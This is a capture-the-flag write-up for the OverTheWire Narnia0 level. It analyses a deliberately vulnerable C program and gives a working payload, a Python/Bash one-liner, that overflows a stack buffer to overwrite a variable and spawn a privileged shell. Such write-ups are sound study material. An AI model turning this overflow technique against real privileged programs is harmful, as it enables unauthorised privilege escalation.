# Narnia0

First level of Narnia's Wargame in https://overthewire.org

---

## Goal

Obtain the credentials for the next level by analyzing the provided C source code.

---

## Initial Info

No binary description was provided.

Passwords for each level are stored in:

```
/etc/narnia_pass/narnia$
```

where `$` corresponds to the level number.

---

## Recon

Started by listing files in the current directory:

```bash
ls -la
```

No relevant files were found.

Searched for Narnia-related files in the system:

```bash
ls -l / | grep narnia
```

Located the Narnia challenge directory and navigated into it.

Viewed the source code:

```bash
cat narnia0.c
```

---

## Source Code

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}
```

---

## Observations

- `buf` is a stack buffer of 20 bytes (`char buf[20]`).
- `val` is a 4-byte long initialized to `0x41414141`.
- The program compares `val` against `0xdeadbeef`.
- `scanf("%24s", &buf)` allows input larger than the buffer size.
- This creates a stack-based buffer overflow vulnerability.

---

## Memory Layout Insight

```
[ buf (20 bytes) ][ padding ][ val (4 bytes) ]
```

Overflowing `buf` allows overwriting `val`.

---

## Hypothesis

If more than 20 bytes are written into `buf`, the extra bytes may overwrite `val`.

Goal is to change:

```
0x41414141 → 0xdeadbeef
```

---

## Exploitation

Initial attempts incorrectly mixed Python and Bash syntax when generating the payload. After correcting the execution context, the payload was generated with Python while Bash handled piping the payload into the vulnerable binary and kept the input stream open after spawning the shell.

Final payload:

```bash
(python -c 'print "A"*20+"\xef\xbe\xad\xde"'; cat) | ./narnia0
```

The payload consists of:

- `20` bytes of padding (`"A"*20`) to completely fill `buf`.
- The bytes `\xef\xbe\xad\xde`, which represent `0xdeadbeef` in little-endian format, overwriting `val`.
- `cat` keeps the standard input open after the shell is spawned, allowing interaction with the elevated shell.

---

## Result

If successful, `val` becomes `0xdeadbeef`, triggering:

```c
system("/bin/sh");
```

This spawns a shell with elevated privileges, allowing access to the next level credentials.

---

## Key Concepts Learned

- Stack-based buffer overflow
- Local variable memory layout
- Little-endian encoding
- Unsafe input handling with `scanf`
- Control-flow manipulation via memory corruption
- Separation of payload generation vs execution environment

---

## Mistakes / Notes

- Initially mixed Python and Bash syntax incorrectly.
- Learned that payload generation and execution should be treated as separate responsibilities.
- The `cat` command was necessary to keep the spawned shell interactive after the exploit succeeded.

---

## Takeaway

Exploitation is less about complex code and more about understanding memory layout, data representation, and correctly structuring the execution environment required to deliver a payload.
